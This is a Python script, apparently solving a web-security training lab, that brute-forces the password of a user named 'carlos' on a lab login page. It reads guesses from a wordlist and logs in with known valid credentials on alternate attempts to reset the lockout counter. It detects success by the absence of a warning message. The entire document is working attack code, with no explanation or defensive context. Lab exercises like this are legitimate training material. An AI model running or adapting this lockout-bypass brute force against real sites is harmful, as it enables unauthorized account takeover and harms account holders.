import requests
from bs4 import BeautifulSoup

lab_url = 'https://0a01004703c6c7628159343700690069.web-security-academy.net/login'

good_creds = {"username": "wiener", "password": "peter"}

def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()

def extractErrorMessage(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.select_one('.is-warning')

victim_username = "carlos"
passwords = readFile("passwords.txt")

index = 1
for password in passwords:
    data = {"username": victim_username, "password": password}
    if index % 2 == 0:
        response = requests.post(url=lab_url, data=good_creds)
    response = requests.post(url=lab_url, data=data)
    err = extractErrorMessage(response.text)
    if not err:
        print(f"password={password}")
        break
    print(err.get_text(strip=True))
    index+=1
